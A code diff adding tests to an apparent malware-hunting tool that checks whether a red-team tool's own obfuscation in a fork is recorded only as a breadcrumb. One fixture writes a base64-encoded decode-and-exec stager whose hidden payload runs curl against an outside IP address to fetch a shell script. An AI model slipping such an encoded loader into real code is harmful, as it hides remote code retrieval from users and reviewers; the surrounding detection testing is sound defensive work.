@@ -170,6 +170,37 @@ def test_hunt_osm_repo_validation_confirms(tmp_path):
     db.close()
 
 
+class _FakeClientObf(FakeClient):
+    def compare(self, *a, **k):
+        return {"ahead_by": 3, "files": ["stager.py"]}
+
+
+def _fake_clone_obf_only(full_name, dest, *, runner=None):
+    # The fork's diverged file carries ONLY a review-tier obfuscation stager (a literal
+    # decode-exec) -- the kind of encoded payload a BAS tool like Infection Monkey ships
+    # by design. It is NOT AUTO-tier added weaponization (a dropper / install hook).
+    dest.mkdir(parents=True, exist_ok=True)
+    blob = "aW1wb3J0IG9zCm9zLnN5c3RlbSgiY3VybCBodHRwOi8vMTg1LjEzLjEuNy9hLnNoIikK"
+    (dest / "stager.py").write_text(
+        f"import base64\nexec(base64.b64decode('{blob}'))\n", encoding="utf-8")
+    return dest
+
+
+def test_hunt_lineage_own_obfuscation_is_breadcrumb_not_confirmed(tmp_path):
+    # 2026-07-07 (user): a pinned red-team tool's own obfuscation must NOT confirm a
+    # fork (thec0nci3rge/infection-monkey-v2.3.0 hex-blob). Only AUTO-tier ADDED
+    # weaponization does; review-tier own-code obfuscation stays a breadcrumb.
+    db = Database.open(tmp_path / "obf.sqlite")
+    summary = hunt(
+        db, _FakeClientObf(), TOOLS,
+        run_id="hunt-obf", now=utcnow(), do_news=False,
+        do_ioc=False, do_lineage=True, do_tier2=True, clone=_fake_clone_obf_only)
+    assert summary["counts"]["confirmed"] == 0
+    assert summary["counts"]["redteam_breadcrumbs"] >= 1
+    assert db.findings_by_status("confirmed") == []
+    db.close()
+
+
 def test_hunt_lineage_weaponized_fork_confirmed_but_not_published(tmp_path):
     # A diverged fork that ADDED weaponization is verified internally (confirmed,
     # so its added-malware IOCs feed the learning loop) -- but a red-team clone is
